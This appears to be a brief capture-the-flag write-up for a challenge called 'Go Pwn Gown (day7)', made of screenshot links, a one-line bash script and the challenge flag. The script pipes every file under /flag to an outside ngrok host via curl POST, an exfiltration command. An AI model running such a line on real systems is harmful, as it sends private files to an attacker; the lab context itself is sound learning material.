# Go Pwn Gown (day7)

<p align="center"><img src="Screenshots/S1.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S2.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S3.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S4.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S5.png" alt="Desc"></p>

````bash
#!/bin/bash
cat /flag/* | curl -X POST --data @- http://6.tcp.eu.ngrok.io:13524/
````

Flag : _RM{OffenSkillSaysWhat2024YouGotGowned}_ , thanks _Laluka_ for this challenge !
